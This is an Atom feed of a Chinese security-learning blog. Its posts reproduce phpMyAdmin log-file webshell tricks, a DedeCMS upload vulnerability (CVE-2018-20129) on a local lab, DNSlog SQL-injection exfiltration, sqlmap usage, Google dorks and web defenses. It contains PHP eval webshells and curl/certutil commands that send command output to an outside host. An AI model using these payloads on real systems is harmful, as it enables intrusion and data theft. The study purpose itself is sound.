<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://Morn-zh.github.io</id>
    <title>Morn-zh</title>
    <updated>2021-04-29T15:02:08.131Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://Morn-zh.github.io"/>
    <link rel="self" href="https://Morn-zh.github.io/atom.xml"/>
    <subtitle>我等着，等着你</subtitle>
    <logo>https://Morn-zh.github.io/images/avatar.png</logo>
    <icon>https://Morn-zh.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Morn-zh</rights>
    <entry>
        <title type="html"><![CDATA[phpMyAdmin随记]]></title>
        <id>https://Morn-zh.github.io/post/phpmyadmin-sui-ji/</id>
        <link href="https://Morn-zh.github.io/post/phpmyadmin-sui-ji/">
        </link>
        <updated>2021-04-29T14:08:46.000Z</updated>
        <content type="html"><![CDATA[<p>版本：phpMyAdmin4.8.5</p>
<p>查阅版本信息：</p>
<p>http://localhost/phpMyAdmin4.8.5/README<br>
http://localhost/phpMyAdmin4.8.5/changelog.php</p>
<h1 id="常规getshell">常规getshell</h1>
<p>1.可以看看网站是否存在注入利用注入出来的账号密码登录（x<br>
2.使用phpmyadmin爆破工具进行爆破进入后台（x</p>
<p>查找物理路径</p>
<p>phpinfo.php</p>
<pre><code>select @@basedir;
</code></pre>
<pre><code>web绝对路径：在可读写的前提下如何获取web路径？

(1) phpinfo() 页面：最理想的情况，直接显示web路径

(2) web报错信息：可以通过各种fuzz尝试让目标报错，也有可能爆出绝对路径

(3) 一些集成的web框架：如果目标站点是利用phpstudy、LAMPP等之类搭建的，可以通过查看数据库路径show variables like '%datadir%'; ，再猜解web路径的方法，一般容易成功。

(4) 利用select load_file() 读取文件找到web路径：可以尝试/etc/passwd，apache|nginx|httpd log之类的文件。

Trick：如何判断目录是否存在，往往确定了/var/www/html目录，但是还有一层目录不能确定，可以采用目标域名+常用的网站根目录的方式进行爆破，当使用select 'test' into outfile '/var/www/$fuzz$/shell.php';时目录$fuzz$不存在将会报错Can't create/write to file '/var/www/html/.666.txt' (Errcode: 2)；如果存在但是目录写不进去将返回(Errcode: 13)；如果使用的load data infile &quot;/etc/passwd&quot; into table test;该语句执行后将也会显示文件是否存在，有权限能否写等信息。

</code></pre>
<p>查看写入权限</p>
<pre><code>show variables like '%secure%'
</code></pre>
<pre><code>select 'test' into outfile '/var/www/webxxx/shell.php'
</code></pre>
<h1 id="日志getshell">日志getshell</h1>
<h2 id="写入日志文件getshell">写入日志文件getshell</h2>
<p>查看日志设置</p>
<pre><code>show variables like 'general_log%'
</code></pre>
<pre><code>第一步手动开启日志。
set global  general_log='on'   //首先设置为on
第二步 修改日志路径
set global  general_log_file =&quot;d:\\phpstudy\\www\\a.php&quot;
然后 查看是否开启成功
show variables like &quot;general_log%&quot;
</code></pre>
<pre><code>然后只要执行的语句都会写入到日志文件中，所以我们查询语句
select '&lt;?php eval($_POST['a']);?&gt;'
虽然报错但已经写进去了
</code></pre>
<h2 id="慢查询写入webshell">慢查询写入webshell</h2>
<p>查询配置</p>
<pre><code>show variables like '%slow%';
</code></pre>
<p>配置路径</p>
<pre><code>set GLOBAL slow_query_log_file='C:/phpStudy/PHPTutorial/WWW/slow.php';
</code></pre>
<p>开启</p>
<pre><code>set GLOBAL slow_query_log=on;
</code></pre>
<p>写入日志</p>
<pre><code>select '&lt;?php phpinfo();?&gt;' from mysql.db where sleep(10);
</code></pre>
<p>参考文章：</p>
<p>https://www.cnblogs.com/xhcbj/p/13356580.html</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[phpinfo中值得注意的点]]></title>
        <id>https://Morn-zh.github.io/post/phpinfo-zhong-zhi-de-zhu-yi-de-dian/</id>
        <link href="https://Morn-zh.github.io/post/phpinfo-zhong-zhi-de-zhu-yi-de-dian/">
        </link>
        <updated>2021-04-27T13:13:49.000Z</updated>
        <content type="html"><![CDATA[<h1 id="phpinfo中值得注意的点">phpinfo中值得注意的点</h1>
<h2 id="如何获取phpinfo页面">如何获取phpinfo页面</h2>
<ul>
<li>扫描器</li>
<li>Google Hacking</li>
<li>⽹站⾃有功能</li>
<li>同个服务器的其他站（旁站）</li>
</ul>
<h2 id="需要注意的参数">需要注意的参数</h2>
<ul>
<li>
<p>System</p>
<p>目标机器的操作系统</p>
</li>
<li>
<p>_ENV[&quot;SCRIPT_FILENAME&quot;]</p>
<p>网站物理路径</p>
</li>
<li>
<p>_SERVER[&quot;SERVER_ADDR&quot;]</p>
<p>目标服务器的真实IP</p>
</li>
<li>
<p>_SERVER[&quot;SERVER_SOFTWARE&quot;]</p>
<p>目标服务器的Web服务器版本</p>
</li>
<li>
<p>allow_url_include</p>
<p>远程包含</p>
<p><a href="https://blog.csdn.net/sunjikui1255326447/article/details/106974354/">什么是远程包含？</a></p>
</li>
<li>
<p>disable_functions</p>
<p>查看禁用函数</p>
<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html">PHP disable_functions Bypass 的方法探究 - Tr0y's Blog</a></p>
</li>
</ul>
<p>php 下能够执行系统命令的函数有哪些？</p>
<pre><code>assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``(反单引号)
Copy
</code></pre>
<p>那么 便可以看看 php.ini 中的 disable_function 漏过了哪些函数，若存在漏网之鱼，直接利用即可</p>
<p>待看文章：</p>
<p>php的笔记学习：https://www.kancloud.cn/a173512/php_note/1690470</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[RSA加密/签名过程+SSL+面试小结]]></title>
        <id>https://Morn-zh.github.io/post/rsa-jia-mi-qian-ming-guo-cheng/</id>
        <link href="https://Morn-zh.github.io/post/rsa-jia-mi-qian-ming-guo-cheng/">
        </link>
        <updated>2021-04-27T08:34:47.000Z</updated>
        <content type="html"><![CDATA[<h1 id="rsa加密签名过程">RSA加密/签名过程</h1>
<p>面试的时候碰到这个问题，但是回答的不是很好，下来自己再总结下</p>
<h2 id="加密-签名的目的">加密、签名的目的</h2>
<p>加密的目的：保证自己发出的东西，只有收件方才能破解</p>
<p>签名的目的：向收件方证明这东西是自己发的（以及防重放、防篡改、防抵赖、防伪造）</p>
<p>加密、解密过程用到的算法：加密算法、解密算法<br>
签名、验签过程用到的算法：签名算法、验签算法</p>
<p>加密和签名是<strong>两个过程</strong>，一般配合使用</p>
<h2 id="加密配合签名进行消息传输的完成过程">加密配合签名进行消息传输的完成过程</h2>
<p>前提：双方都有各自的公私钥（<strong>两套</strong>不同的公私钥组合），并且通过前期的通信拥有对方的公钥。</p>
<p>加密/解密和签名/验签完整过程:<br>
A--&gt;B（A发送给B）</p>
<p>1、A用hash算法对待发内容<code>content</code>生成摘要<code>summary</code><br>
2、A用自己的私钥<code>secret_key_A</code>对摘要<code>summary</code>进行签名得到签名<code>signature</code><br>
3、A使用B的公钥<code>public_key_B</code>对（签名<code>signature</code>+待发内容<code>content</code>）进行加密得到密文<code>encrypted_string</code><br>
4、A将密文<code>encrypted_string</code>发送给B</p>
<p>5、B接收到密文<code>encrypted_string</code>，使用自己的私钥<code>secret_key_B</code>进行解密，分离出签名<code>signature</code>、接收内容<code>content</code><br>
6、B用A的公钥<code>public_key_A</code>解密签名<code>signature</code>得到摘要1<code>summary_1</code><br>
7、B用同样的hash算法对接收内容<code>content</code>生成摘要2<code>summary_2</code><br>
8、B对比摘要1和摘要2是否相等，相等即验证了消息是A发的并且传输的过程中为被篡改或伪造</p>
<p>图解<br>
<img src="https://img-blog.csdnimg.cn/20200910095112326.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MjM4Nzc1,size_16,color_FFFFFF,t_70#pic_center" alt="img" loading="lazy"><br>
图片来自：https://blog.csdn.net/m0_46238775/article/details/108507660?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-5&amp;spm=1001.2101.3001.4242</p>
<h1 id="ssl">SSL</h1>
<p>安全套接字，https协议的重要组成部分<br>
以下几篇文章配合阅读，写的比我更好、更详细</p>
<p>SSL单向验证：https://blog.csdn.net/sarafina527/article/details/89333536?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-9&amp;spm=1001.2101.3001.4242</p>
<p>HTTPS过程：https://www.cnblogs.com/xtiger/p/11026870.html<br>
SSL双向验证：https://blog.csdn.net/jingzi123456789/article/details/81020747</p>
<p>全过程图解：https://blog.csdn.net/u011779724/article/details/80776776</p>
<p>计网小结：https://blog.csdn.net/u010858605/article/details/113686420</p>
<h1 id="面试小结">面试小结</h1>
<p>第一次面试，面试的对象还是字节，心里还是忐忑的。<br>
结果暂时未知，自我感觉不太好，暴露了些问题，需要去解决</p>
<ul>
<li>基础不牢，对语言的理解不够，还需要深入理解</li>
<li>算法丢人了，脑袋直接短路，练得还不够，加强code方面的练习--&gt;leetcode走起</li>
<li>继续学习，不要停下来！</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DedeCMS V5.7 SP2前台文件上传漏洞(CVE-2018-20129)复现]]></title>
        <id>https://Morn-zh.github.io/post/dedecms-v57-sp2-qian-tai-wen-jian-shang-chuan-lou-dong-cve-2018-20129fu-xian/</id>
        <link href="https://Morn-zh.github.io/post/dedecms-v57-sp2-qian-tai-wen-jian-shang-chuan-lou-dong-cve-2018-20129fu-xian/">
        </link>
        <updated>2021-04-26T14:51:50.000Z</updated>
        <content type="html"><![CDATA[<h1 id="dedecms-v57-sp2前台文件上传漏洞cve-2018-20129复现">DedeCMS V5.7 SP2前台文件上传漏洞(CVE-2018-20129)复现</h1>
<h2 id="部署本地环境">部署本地环境</h2>
<h3 id="环境">环境</h3>
<p>phpstudy(Apache2.4.39+MySQL5.7.26+php5.2.17nts)</p>
<p>DedeCMS V5.7 SP2</p>
<h3 id="部署步骤">部署步骤</h3>
<p>1、将dedecms下载到本地后，将upload文件夹中的全部文件剪切到C:\phpStudy_64\phpstudy_pro\WWW\dedecms，其中dedecms为新建目录（可自定义</p>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_18-43-04.png" alt="Snipaste_2021-04-26_18-43-04" loading="lazy"></figure>
<p>2、开启Apache和MySQL</p>
<p>3、访问127.0.0.1/dedecms,会跳转到初始化界面，填上本地的数据库账号密码，一路下一步就行了</p>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_18-57-50.png" alt="Snipaste_2021-04-26_18-57-50" loading="lazy"></figure>
<h2 id="复现要求">复现要求</h2>
<p>登录的用户必须为<strong>管理员</strong>，不然没有<strong>上传权限</strong></p>
<h2 id="复现开始">复现开始</h2>
<h3 id="访问后台">访问后台</h3>
<p>因为系统已经给出了默认管理员用户，所以我们直接用这个账号（如果想要使用其他自己注册的账号，需要给这个账号管理员权限才行</p>
<p>默认账号：admin</p>
<p>默认密码：admin</p>
<p>访问后台：127.0.0.1/dedecms/dede</p>
<p>输入账号密码进行登录</p>
<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-03-42.png" alt="Snipaste_2021-04-26_19-03-42" loading="lazy"></figure>
<h3 id="访问个人中心">访问个人中心</h3>
<p>访问：127.0.0.1/dedecms/member</p>
<p>提示未开启会员功能</p>
<figure data-type="image" tabindex="4"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-05-31.png" alt="Snipaste_2021-04-26_19-05-31" loading="lazy"></figure>
<p>解决方式</p>
<figure data-type="image" tabindex="5"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-06-25.png" alt="Snipaste_2021-04-26_19-06-25" loading="lazy"></figure>
<p><strong>记得点确定！</strong></p>
<p>再次访问：127.0.0.1/dedecms/member</p>
<h3 id="进入内容中心">进入内容中心</h3>
<figure data-type="image" tabindex="6"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-10-39.png" alt="Snipaste_2021-04-26_19-10-39" loading="lazy"></figure>
<p>这里会提示你完善个人信息，不管他，直接拉到最底下，点击提交就行</p>
<h3 id="进入发表文章的页面">进入发表文章的页面</h3>
<figure data-type="image" tabindex="7"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-14-45.png" alt="Snipaste_2021-04-26_19-14-45" loading="lazy"></figure>
<h3 id="尝试上传jio本">尝试上传jio本</h3>
<p>1、首先上传正常的图片试试，点击上传到服务器，很明显，上传成功。并且，这里我们可以很明显的观察到图片被<strong>重命名</strong>了，这可能会对后面运行脚本造成麻烦，暂时先不管这个问题</p>
<figure data-type="image" tabindex="8"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-17-18.png" alt="Snipaste_2021-04-26_19-17-18" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-18-48.png" alt="Snipaste_2021-04-26_19-18-48" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-20-52.png" alt="Snipaste_2021-04-26_19-20-52" loading="lazy"></figure>
<p>2、再尝试直接上传jio本（一句话木马）试试</p>
<figure data-type="image" tabindex="11"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-25-58.png" alt="Snipaste_2021-04-26_19-25-58" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-23-29.png" alt="Snipaste_2021-04-26_19-23-29" loading="lazy"></figure>
<p>被阻拦了，显示不是管理员允许的类型</p>
<p>3、试着改下后缀试试（Burp修改</p>
<figure data-type="image" tabindex="13"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-27-23.png" alt="Snipaste_2021-04-26_19-27-23" loading="lazy"></figure>
<p>嗯？改下大小写似乎不太行</p>
<figure data-type="image" tabindex="14"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-27-42.png" alt="Snipaste_2021-04-26_19-27-42" loading="lazy"></figure>
<p>4、再用%00绕过试试，顺便给它加上可能被允许的后缀</p>
<figure data-type="image" tabindex="15"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-29-52.png" alt="Snipaste_2021-04-26_19-29-52" loading="lazy"></figure>
<p>好家伙，提示格式不对，似乎会对文件的类型进行检验</p>
<p>5、那就伪造一个图片木马</p>
<pre><code>GIF89A &lt;?php @eval($_POST['pass']) ?&gt;
</code></pre>
<p>命名为pic_muma.php.jpg</p>
<p>继续上传试试，似乎成功了</p>
<figure data-type="image" tabindex="16"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-51-01.png" alt="Snipaste_2021-04-26_19-51-01" loading="lazy"></figure>
<p>注意到，返回了图片的路劲，我们去看看，结果发现，后缀名被改了，php后缀不见了，写入的一句话也不见了</p>
<p>6、看下后台代码吧</p>
<figure data-type="image" tabindex="17"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_20-00-36.png" alt="Snipaste_2021-04-26_20-00-36" loading="lazy"></figure>
<p>看下图中的几个箭头，从上到下分别是</p>
<ul>
<li>去除文件名字中的特殊符号</li>
<li>确认文件名中是否存在系统允许的文件后缀</li>
<li>将图片类型小写</li>
<li>确认是否在系统允许的文件类型中</li>
</ul>
<p>分析下，主要的漏洞来自于第2点，正则匹配，说明只要里面有这个允许的后缀，不一定需要它在最后当后缀，于是有了如下的构造</p>
<pre><code>pic_muma.jpg.ph*p
</code></pre>
<p>首先将jpg写到文件名中间，那么最后运行的时候就不会被认为是jpg文件了。</p>
<p>后缀构建成ph*p（星号可以用上述中出现的符号代替）。这样在后台进行特殊符号剔除后，就会重新组合成php后缀</p>
<p>7、重新开始！</p>
<figure data-type="image" tabindex="18"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_20-18-15.png" alt="Snipaste_2021-04-26_20-18-15" loading="lazy"></figure>
<p>上传成功，但是咋没给返回上传地址？</p>
<p>我们查看文件夹，其实已经上传上了，就是没返回地址……</p>
<figure data-type="image" tabindex="19"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_20-16-50.png" alt="Snipaste_2021-04-26_20-16-50" loading="lazy"></figure>
<p>我直接疑惑，查看原文章说是太简易了，解析出错……</p>
<p>8、那我们重新做一个伪装更精细的~</p>
<pre><code>copy wula.jpg/b + muma.php new_muma.jpg
</code></pre>
<p>wula.jpg随便找的正常图片</p>
<p>/b指定为二进制形式</p>
<p>9、再再次上传</p>
<figure data-type="image" tabindex="20"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_20-48-30.png" alt="Snipaste_2021-04-26_20-48-30" loading="lazy"></figure>
<p>好耶！查看文件</p>
<figure data-type="image" tabindex="21"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_20-50-13.png" alt="Snipaste_2021-04-26_20-50-13" loading="lazy"></figure>
<p>10、上去了！试着用蚁剑连接下</p>
<figure data-type="image" tabindex="22"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_20-52-05.png" alt="Snipaste_2021-04-26_20-52-05" loading="lazy"></figure>
<figure data-type="image" tabindex="23"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_20-54-52.png" alt="Snipaste_2021-04-26_20-54-52" loading="lazy"></figure>
<p>好耶！+n</p>
<p>其实这个过程会出现如下情况，用浏览器查看php文件，会报语法错误，这时候不要慌，换个图片，或者手动将报错的那几行删除掉就行了~</p>
<h2 id="后记">后记</h2>
<p>有哪些避免检测的绕过方法？</p>
<p>正确的检测流程应该是怎么样？</p>
<p>后续有时间补充！</p>
<p>参考文章：</p>
<p>http://www.cnhonkerarmy.com/forum.php?mod=viewthread&amp;tid=155535</p>
<p><a href="https://www.php.cn/php-ask-430303.html">php一句话图片木马是怎么解析的？</a></p>
<h2 id=""></h2>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Google Hacking语法记录]]></title>
        <id>https://Morn-zh.github.io/post/google-hacking-yu-fa-ji-lu/</id>
        <link href="https://Morn-zh.github.io/post/google-hacking-yu-fa-ji-lu/">
        </link>
        <updated>2021-04-22T12:44:20.000Z</updated>
        <content type="html"><![CDATA[<h1 id="google-hacking">Google Hacking</h1>
<p>其实就是谷歌搜索的语法，某些参数在其他搜索引擎中也适用</p>
<h2 id="基本检索">基本检索</h2>
<ul>
<li>逻辑与：and</li>
<li>逻辑或： or</li>
<li>逻辑非： -</li>
<li>完整匹配：&quot;关键词&quot;</li>
<li>通配符：* ?</li>
</ul>
<pre><code>&quot;好玩的&quot; or &quot;好笑的&quot; -zhihu.com
</code></pre>
<p>完整匹配“好玩的”或者“好笑的”，排除知乎的结果</p>
<h2 id="高级检索">高级检索</h2>
<h3 id="site">site</h3>
<p>指定站点</p>
<h3 id="inurl">inurl</h3>
<p>指定url中的信息</p>
<h3 id="intitle">intitle</h3>
<p>指定标题中的信息</p>
<pre><code>site:bilibili.com inurl:搞笑 intitle:up主
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/Google_Hacking/Snipaste_2021-04-22_20-17-56.png" alt="Snipaste_2021-04-22_20-17-56" loading="lazy"></figure>
<p>查看织梦cms的特征</p>
<pre><code>inurl:dede
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/Google_Hacking/Snipaste_2021-04-22_20-52-25.png" alt="Snipaste_2021-04-22_20-52-25" loading="lazy"></figure>
<p><br>以上三个是经常遇到的，都是字面意思</p>
<br>
<h3 id="intext">intext</h3>
<p>在文本中</p>
<h3 id="allinurl">allinurl</h3>
<p>类似inurl，只不过可以指定多个关键词</p>
<h3 id="filetype">filetype</h3>
<p>指定文件类型</p>
<h3 id="link">link</h3>
<p>返回所有指向该url的页面</p>
<h3 id="related">related</h3>
<p>返回与该url类似的所有网站</p>
<h3 id="cache">cache</h3>
<p>返回关于该url的缓存页面</p>
<h2 id="常见的一些使用">常见的一些使用</h2>
<h3 id="查找网站后台">查找网站后台</h3>
<p>site:xx.com intext:管理<br>
site:xx.com inurl:login<br>
site:xx.com intitle:后台</p>
<h3 id="查看服务器使用的程序">查看服务器使用的程序</h3>
<p>site:xx.com filetype:asp<br>
site:xx.com filetype:php<br>
site:xx.com filetype:jsp<br>
site:xx.com filetype:aspx</p>
<h3 id="查看上传漏洞">查看上传漏洞</h3>
<p>site:xx.com inurl:file<br>
site:xx.com inurl:load</p>
<h3 id="查看可能存在sql注入的网站">查看可能存在SQL注入的网站</h3>
<pre><code>inurl:id=1
</code></pre>
<h2 id="后记">后记</h2>
<p>本篇主要是用来记录谷歌搜索引擎的相关语法，方便以后的信息收集</p>
<p>参考：</p>
<p>https://blog.csdn.net/qq_36119192/article/details/84029809（强烈推荐）</p>
<p>http://www.williamlong.info/archives/150.html</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[常见web漏洞防御措施汇总]]></title>
        <id>https://Morn-zh.github.io/post/chang-jian-web-lou-dong-fang-yu-cuo-shi-hui-zong/</id>
        <link href="https://Morn-zh.github.io/post/chang-jian-web-lou-dong-fang-yu-cuo-shi-hui-zong/">
        </link>
        <updated>2021-04-20T13:29:36.000Z</updated>
        <content type="html"><![CDATA[<h1 id="常见web漏洞防御措施汇总">常见web漏洞防御措施汇总</h1>
<p>将之前学到和看到的web漏洞做下汇总吧，加深记忆的同时也方便以后的查阅~</p>
<h2 id="sql注入">SQL注入</h2>
<p>1、使用预编译，绑定变量。使用预编译过的语句，SQL语义不会发生改变。</p>
<p>2、使用安全的存储过程</p>
<p>3、检查数据类型，包括但不限于数据的类型、数据的长度、数据的格式。</p>
<p>4、使用安全函数</p>
<p>5、限制网站用户的数据库权限</p>
<p>6、配置数据库安全参数</p>
<h2 id="xss跨站脚本">XSS跨站脚本</h2>
<p>1、使用HttpOnly，禁止页面的JS访问带有HttpOnly属性的Cookie（对抗Cookie劫持</p>
<p>2、输入检查（客户端和服务端都需要进行检查</p>
<p>3、输出检查（富文本输出、编码、转义</p>
<p>4、使用安全的编码函数</p>
<h2 id="csrf跨站请求伪造">CSRF跨站请求伪造</h2>
<p>1、验证码</p>
<p>2、Referer Check</p>
<p>3、Anti SCRF Token</p>
<h2 id="上传漏洞">上传漏洞</h2>
<p>1、文件扩展名校验</p>
<p>2、文件内容校验</p>
<p>3、上传文件重命名</p>
<p>4、文件上传目录设置权限</p>
<h2 id="ddos攻击">DDos攻击</h2>
<p>1、采用高性能的网络设备</p>
<p>2、高带宽</p>
<p>3、安装防火墙</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DNSlog的使用]]></title>
        <id>https://Morn-zh.github.io/post/dnslog-de-shi-yong/</id>
        <link href="https://Morn-zh.github.io/post/dnslog-de-shi-yong/">
        </link>
        <updated>2021-04-20T07:25:49.000Z</updated>
        <content type="html"><![CDATA[<h1 id="dnslog的使用">DNSlog的使用</h1>
<h2 id="原理">原理</h2>
<p>DNS服务器解析域名的时候会留下log日志，如果DNS服务器是自己的，那么我们就可以从log信息中获得信息</p>
<h2 id="应用场景">应用场景</h2>
<p>1、SQL注入中的盲注</p>
<p>2、无回显的命令执行</p>
<p>3、无回显的SSRF</p>
<h2 id="使用到的函数">使用到的函数</h2>
<p>load_file()函数</p>
<p>load_file()使用限制：</p>
<p>1.文件必须位于服务器主机上。</p>
<p>2.当前用户必须具有读取文件的权限</p>
<pre><code>select * from mysql.user where user='user_name';
</code></pre>
<p>3.文件的大小小于max_allowed_packet字节。（暂时不清楚实际渗透过程中会不会遇到</p>
<p>4.读取的文件位于secure_file_priv设置的范围内</p>
<pre><code>SHOW VARIABLES LIKE 'secure_file_priv';
</code></pre>
<p>Q：为什么要用load_file函数呢？</p>
<p>A：因为load_file函数可以解析dns请求。</p>
<p>数据库中使用此payload：select load_file('\\SQL注入查询语句.a.com')</p>
<p>注意：load_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows的一个小Tips——UNC路径。</p>
<h2 id="环境">环境</h2>
<p>dnslog.cn</p>
<p>sqli-labs-Less-5</p>
<h2 id="实践">实践</h2>
<p>判断存在注入，并且无明显回显，这里我们考虑下使用DNSlog</p>
<h3 id="获取dns域名">获取DNS域名</h3>
<p>先访问<a href="dnslog.cn">dnslog.cn</a>，谷歌浏览器，似乎需要翻墙</p>
<p>获得一个域名</p>
<p>这里我获得的域名是：4325u7.dnslog.cn</p>
<h3 id="注入开始">注入开始</h3>
<p>payload：</p>
<pre><code>http://127.0.0.1/sqli-lab/Less-5/?id=1' and if((select load_file(concat('\\\\',(select database()),'.4325u7.dnslog.cn\\aaa'))),1,1)--+
</code></pre>
<p>页面会加载一会儿，可能是网络原因</p>
<p>查看DNSlog信息</p>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/dnslog/QQ%E6%88%AA%E5%9B%BE20210420150952.png" alt="QQ截图20210420150952" loading="lazy"></figure>
<p>可以看到，数据库名信息就会放到和域名信息一起被记录到DNSlog里面了</p>
<p>查看表名</p>
<pre><code>' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.4325u7.dnslog.cn\\aaa'))),1,1)--+
</code></pre>
<p>……</p>
<h2 id="搭建dnslog服务器">搭建DNSlog服务器</h2>
<p>这⾥推荐BugScanTeam的 https://github.com/BugScanTeam/DNSLog ，该项⽬主页是有搭建教程的，按⾃⼰的 需求搭建。</p>
<h2 id="使用中间件日志">使用中间件日志</h2>
<p>除了DNS的log，在可以执⾏系统命令的情况还可以利⽤HTTP的log，就是通过<strong>中间件的⽇志</strong>来获取结果。</p>
<h4 id="linux">Linux</h4>
<pre><code>for /F &quot;delims=\&quot; %i in ('whoami') do curl https://www.yourweb.net/%i 
</code></pre>
<p>如果碰到内容有空格（换⾏符等），就会截断，只输出前⾯的，这时候可以利⽤编码来输出，但有输出字符数最⼤ 限制；</p>
<pre><code>curl http://xxx.dnslog.link/$(id|base64)
curl http://xxx.dnslog.link/`id|base64`
</code></pre>
<h4 id="windows">windows</h4>
<p>#启动浏览器访问</p>
<pre><code>for /F %x in ('whoami') do start https://yourweb.net/%x
</code></pre>
<p>#内置命令⾏⼯具访问</p>
<pre><code>for /F %x in ('whoami') do certutil.exe -urlcache -split -f https://www.yourweb.net/%x
</code></pre>
<p>#只列出⽂件名</p>
<pre><code>for /F %x in ('dir /b') do certutil.exe -urlcache -split -f https://www.yourweb.net/%x
</code></pre>
<p>windows下的base64编码</p>
<p>暂时未找到能直接像Linux那样可以通过管道来加密的，但通过多次命令的执⾏达到先base64加密，再做HTTP请求</p>
<pre><code>whoami &gt; result.txt
certutil -encode result.txt result_bs64
for /f %x in (result_bs64) do certutil.exe -urlcache -split -f http://www.yourweb.net/%x
</code></pre>
<p>每⼀个请求都会出现两个请求⽇志，所以要去重复！</p>
<p>并把结果保存为result_bs64_local ，然后再把这个result_bs64_local ⾥⾯加密的⽂件内容解密，命令为：</p>
<pre><code>certutil -decode result_bs64_local result_local.txt
</code></pre>
<h2 id="总结">总结</h2>
<p>参考文章：</p>
<p>https://www.cnblogs.com/sunny11/p/14399420.html</p>
<p>后续需要看:</p>
<p><a href="https://www.cnblogs.com/sunny11/p/14522023.html">Getshell的姿势总结</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sqlmap的实践与总结]]></title>
        <id>https://Morn-zh.github.io/post/sqlmap-de-shi-jian-yu-zong-jie/</id>
        <link href="https://Morn-zh.github.io/post/sqlmap-de-shi-jian-yu-zong-jie/">
        </link>
        <updated>2021-04-18T12:29:15.000Z</updated>
        <content type="html"><![CDATA[<h1 id="sqlmap的实践与总结">sqlmap的实践与总结</h1>
<h2 id="本地测试">本地测试</h2>
<h3 id="1-查看banner信息">1、查看banner信息</h3>
<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; --banner
</code></pre>
<p>--cookie:指定cookie信息</p>
<p>--banner：打印banner信息，准确的版本号</p>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418191430.png" alt="QQ截图20210418191430" loading="lazy"></figure>
<p>查看下报错注入的返回</p>
<pre><code> http://127.0.0.1:80/DVWA/vulnerabilities/sqli/?id=1' AND EXTRACTVALUE(2972,CONCAT(0x5c,0x717a786b71,(SELECT (ELT(2972=2972,1))),0x71707a6271)) AND 'bOmG'='bOmG&amp;Submit=Submit
</code></pre>
<pre><code>XPATH syntax error: '\qzxkq1qpzbq'
</code></pre>
<p>？？？返回的是个啥？</p>
<p>不过有手工注入的经验，知道可以注入就Ok了~</p>
<h3 id="2-查看数据库信息">2、查看数据库信息</h3>
<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; --dbs
</code></pre>
<p>--dbs：查看数据库信息</p>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418191749.png" alt="QQ截图20210418191749" loading="lazy"></figure>
